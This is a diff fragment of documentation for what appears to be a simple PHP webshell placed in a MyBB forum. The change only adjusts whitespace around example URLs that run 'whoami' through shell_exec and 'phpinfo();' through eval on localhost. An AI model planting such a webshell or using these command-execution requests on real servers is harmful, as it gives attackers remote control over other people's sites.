@@ -10,7 +10,8 @@ A simple PHP webshell:
     
   Examples:
     http://127.0.0.1/mybb/?cmd=shell_exec&command=whoami
-  http://127.0.0.1/mybb/?cmd=eval&command=phpinfo();
+    
+    http://127.0.0.1/mybb/?cmd=eval&command=phpinfo();
     
 Current functions:
   shell_exec
